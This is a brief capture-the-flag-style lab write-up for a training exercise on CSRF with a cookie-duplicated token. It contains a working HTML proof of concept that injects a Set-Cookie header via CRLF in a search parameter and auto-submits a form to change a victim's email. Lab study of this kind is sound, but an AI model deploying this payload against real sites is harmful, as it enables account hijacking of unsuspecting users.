# Lab: CSRF where token is duplicated in cookie

 This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter 

## CSRF 
* 題目中 cookie 的 csrf 跟 token 是一樣的，可以推斷只要兩者一樣就可以改 email
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://ac881f1d1f359369c0fa0f73003e00f2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="exploit&#64;entroy&#46;tk" />
      <input type="hidden" name="csrf" value="emZQ78eji8iGETEAN1Kjf3rfdRPODyu0" />
    </form>
    <script>
    var image = new Image();
    image.src = "https://ac881f1d1f359369c0fa0f73003e00f2.web-security-academy.net/?search=a%0d%0aSet-Cookie:+csrf=emZQ78eji8iGETEAN1Kjf3rfdRPODyu0";
    image.onerror = document.forms[0].submit();
    </script>
  </body>
</html>
```